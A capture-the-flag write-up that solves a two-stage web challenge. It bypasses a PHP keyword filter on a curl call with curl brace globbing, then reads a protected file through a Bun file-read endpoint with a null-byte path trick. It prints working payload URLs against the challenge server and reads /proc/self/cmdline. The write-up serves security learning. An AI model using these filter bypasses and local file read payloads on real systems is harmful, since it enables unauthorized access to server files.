given code:
```
highlight_file(__FILE__);
$url = 'file:///hi.txt';
if(
    array_key_exists('x', $_GET) &&
    !str_contains(strtolower($_GET['x']),'file') && 
    !str_contains(strtolower($_GET['x']),'next')
){
    $url = $_GET['x'];
}
system('curl '.escapeshellarg($url));
```
+ This script checks If 'x' exists in the GET parameters and it does not contain the words "file" or "next" (case-insensitive), it assigns the value of 'x' to the $url variable. Finally, it uses the system function to execute a curl command on the $url.
+ The general idea for this step is to bypass these conditions to construct a string equivalent to `file:///next.txt`.
  ![image](https://github.com/av4nth1ka/My-Writeups/assets/80388135/97b38eb7-82e8-4fc7-a723-1533dea97b6a)
+ Looking at the manpage of curl command we can see the following:
![image](https://github.com/av4nth1ka/My-Writeups/assets/80388135/ae34353d-ee6c-478a-9bd2-5fa39424b4a1)

+ Curly braces specify a list of strings that can be matched like in this example `http://site.{one,two,three}.com`. We can construct a similar list with one word that is a substring for `file` and `next` to bypass the check:
`http://45.147.231.180:8000/?x={f}ile:///{n}ext.txt`
+ When we gave the above url, it worked out and told to go to the mentioned url
+ and then we got something like this:
did you know i can read files?? amazing right,,, maybe try /39c8e…/read/?file=/proc/self/cmdline’
After going to /proc/self/cmdline, we get this L2Jpbi9idW4tMS4wLjIAL2FwcC9pbmRleC5qcwA=
+ after decoding: `/bin/bun-1.0.2�/app/index.js�`
+ This file `/proc/self/cmdline` provides information about command line argument that was used to launch currently executing process. We can read them by changing the URL that we want to read. `/app/index.js` seems useful to figure out what to do next:
```
const fs = require('node:fs');
const path = require('path')

/*
I wonder what is inside /next.txt  
*/

const secret = '39c8e9...'
const server = Bun.serve({
  port: 8000,
  fetch(req) {
  	let url = new URL(req.url);
  	let pname = url.pathname;
  	if(pname.startsWith(`/${secret}`)){
      if(pname.startsWith(`/${secret}/read`)){
        try{
          let fpath = url.searchParams.get('file');
          console.log(path.basename(fpath));
          if(path.basename(fpath).indexOf('next') == -1){ 
            return new Response(fs.readFileSync(fpath).toString('base64'));
          } else {
            return new Response('no way');
          }
        } catch(e){ }
        return new Response("Couldn't read your file :(");
      }
      return new Response(`did you know i can read files?? amazing right,,, maybe try /${secret}/read/?file=/proc/self/cmdline`);
    }
    return 
  }
});
```
+The hint says that we have to read `next.txt` file. This script runs a server that fetches methods to handle incoming requests. We parse a URL. Then, search for file arguments in the URL. Next, we have interesting fragment:
+ `‘ if(path.basename(fpath).indexOf('next') == -1) ’. `
+ this condition checks if we do not try to read a `next.txt` file. Then, if the condition is met we read a file that is base64 encoded and returned in a request.
+ We need to find a string that meets the condition, but it somehow treated differently by `fs.readFileSync` and `basename`.
+ ystem calls take NULL-terminated strings, so we can wonder how the NULL character (`%00`) is handled. If there is no special handing in Node.js standard library, it might just make the system call ignore the rest of the string
+ final payload:
+ 'http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/next.txt%00/foo'
+ basename(“/next.txt\0/foo”) = “/foo”, so the path passes the filter.
